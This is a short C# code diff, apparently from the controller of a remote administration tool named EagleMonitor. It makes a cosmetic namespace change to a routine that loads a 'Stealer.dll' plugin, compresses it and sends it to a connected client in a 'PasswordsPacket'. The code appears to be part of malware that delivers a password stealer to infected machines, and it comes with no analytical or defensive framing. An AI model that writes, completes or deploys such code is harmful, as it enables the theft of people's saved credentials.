@@ -31,7 +31,7 @@ namespace EagleMonitor.Forms
 
             PasswordsPacket passwordsPacket = new PasswordsPacket
             {
-                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
+                plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Miscellaneous.GPath + "\\Plugins\\Stealer.dll"), 1)
             };
 
             this.clientHandler.SendPacket(passwordsPacket);
